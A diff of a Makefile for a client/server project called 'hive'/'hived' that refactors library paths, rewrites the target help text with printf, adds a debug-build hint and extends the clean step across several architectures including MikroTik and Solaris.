@@ -21,60 +21,57 @@
 CLIENT_BASENAME = hive
 SERVER_BASENAME = hived
 
-SSL = ../common/ssl/library
-CRYPTO = ../common/crypto
-BZIP2 = ../common/bzip2
+COMMON = ../common
+SSL = $(COMMON)/ssl/library
+CRYPTO = $(COMMON)/crypto
+BZIP2 = $(COMMON)/bzip2
+STRINGS = $(COMMON)/strings
 
 .SILENT:
 
 .PHONY: all linux-x86
 all: 
-	@echo
-	@echo
-	@echo " Please specify a supported target:"
-	@echo 
-	@echo "  make linux-x86"
-	@echo "  make linux-x86_64"
-	@echo "  make solaris-x86"
-	@echo "  make solaris-sparc"
-	@echo "  make mikrotik-x86"
-	@echo "  make mikrotik-mips"
-	@echo "  make mikrotik-mipsel"
-	@echo "  make mikrotik-ppc"
-	@echo "  make arm"
-	@echo
-	@echo
-	@echo " Administrative tasks, ..."
-	@echo "  make clean"
-	@echo "  make tarball    ( on Linux machines only)"
-	@echo
-	@echo
+	printf "\n\nPlease specify a supported target:\n\n"
+	printf "\tmake linux-x86\n"
+	printf "\tmake linux-x86_64\n"
+	printf "\tmake solaris-x86\n"
+	printf "\tmake solaris-sparc\n"
+	printf "\tmake mikrotik-x86\n"
+	printf "\tmake mikrotik-mips\n"
+	printf "\tmake mikrotik-mipsel\n"
+	printf "\tmake mikrotik-ppc\n"
+	printf "\tmake arm\n\n"
+	printf "To build a debug version use:\n"
+	printf "\t make DEBUG=1 <target>\n\n"
+	printf "Administrative tasks, ...\n"
+	printf "\tmake clean\n"
+	printf "\tmake tarball    ( on Linux machines only)\n\n"
 
-linux-x86: build_clean
+linux-x86:
 	@make -f Makefile.arch TARGET=linux-x86
 
-linux-x86_64: build_clean
+linux-x86_64:
 	@make -f Makefile.arch TARGET=linux-x86_64
 
-solaris-x86: build_clean
+solaris-x86:
 	@make -f Makefile.arch TARGET=solaris-x86
 
-solaris-sparc: build_clean
+solaris-sparc:
 	@make -f Makefile.arch TARGET=solaris-sparc
 
-mikrotik-x86: build_clean
+mikrotik-x86:
 	@make -f Makefile.arch TARGET=mikrotik-x86
 
-mikrotik-mipsel: build_clean
+mikrotik-mipsel:
 	@make -f Makefile.arch TARGET=mikrotik-mipsel
 
-mikrotik-mips: build_clean
+mikrotik-mips:
 	@make -f Makefile.arch TARGET=mikrotik-mips
 
-mikrotik-ppc: build_clean
+mikrotik-ppc:
 	@make -f Makefile.arch TARGET=mikrotik-ppc
 
-arm: build_clean
+arm:
 	@make -f Makefile.arch TARGET=arm
 
 CLEAN_LIST := *.o *PATCHED init_strings.* proj_strings* init_crypto_strings.*
@@ -92,7 +89,9 @@ clean:
 	for file in $(CLEAN_LIST); do \
 		rm -f $$file; \
 	done
+	>ARCH_BUILD
 
+	$(MAKE) -C $(STRINGS) clean
 	$(MAKE) -C $(SSL) clean
 	$(MAKE) -C $(CRYPTO) clean
 	$(MAKE) -C $(BZIP2) clean
